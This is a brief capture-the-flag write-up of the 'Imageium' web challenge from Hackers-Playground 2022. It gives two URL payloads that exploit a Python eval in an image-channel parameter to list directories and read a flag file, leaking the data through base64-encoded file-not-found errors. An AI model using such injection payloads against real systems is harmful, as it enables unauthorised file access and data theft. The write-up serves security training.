---
title: "Imageium - Hackers-Playground 2022"
category: "web"
subcategory: "web"
type: "writeup"
tags: ["web", "base64", "imageium", "web-exploitation", "hackers-playground", "perfectblue"]
summary: "In this challenge, we got a website that let you specify an arithmetic combination"
source:
  name: "perfectblue/ctf-writeups"
  url: "https://github.com/perfectblue/ctf-writeups/blob/db9b964bf35c210567ea508383e91a9c423adaee/2022/Hackers-Playground-2022/Imageium/README.md"
ctf:
  name: "Hackers-Playground"
  year: 2022
  challenge: "Imageium"
---

## Source

- **CTF:** Hackers-Playground 2022
- **Challenge:** Imageium
- **Repository:** [perfectblue/ctf-writeups](https://github.com/perfectblue/ctf-writeups)
- **File:** <https://github.com/perfectblue/ctf-writeups/blob/db9b964bf35c210567ea508383e91a9c423adaee/2022/Hackers-Playground-2022/Imageium/README.md>

---
# Imageium

In this challenge, we got a website that let you specify an arithmetic combination
of color channels to pull from an image, and they must've used "eval" in the back-end
when reading the input. The box didn't have many binaries for exfiltration, but it
returned errors to us. The payloads above base64-encode the thing I want, then try
to open it as a file. That triggers a "Can't find file named XXX" error that lets
me exfiltrate.

## Payload

```
http://imageium.sstf.site/dynamic/modified?mode=open(__import__(%27base64%27).b64encode(repr(__import__(%27os%27).listdir()).encode()).decode())
http://imageium.sstf.site/dynamic/modified?mode=open(__import__(%27base64%27).b64encode(open(%22secret/flag.txt%22,%22rb%22).read()).decode())
```
